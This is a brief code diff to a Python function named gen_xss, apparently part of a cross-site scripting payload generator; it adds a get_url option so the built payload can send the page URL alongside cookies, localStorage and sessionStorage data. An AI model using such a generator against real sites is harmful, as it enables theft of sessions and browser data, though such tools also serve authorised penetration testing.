@@ -19,6 +19,7 @@ def gen_xss(id):
     cookies = False
     local_storage = False
     session_storage = False
+    get_url = False
 
     for param, value in parameters.items():
 
@@ -91,7 +92,7 @@ def gen_xss(id):
             payload += 'origin_url="+encodeURIComponent(location.href)'
 
         if other_data != '':
-            if cookies or local_storage or session_storage:
+            if cookies or local_storage or session_storage or get_url:
                 payload += '+"&'
             payload += other_data
             payload += '"'
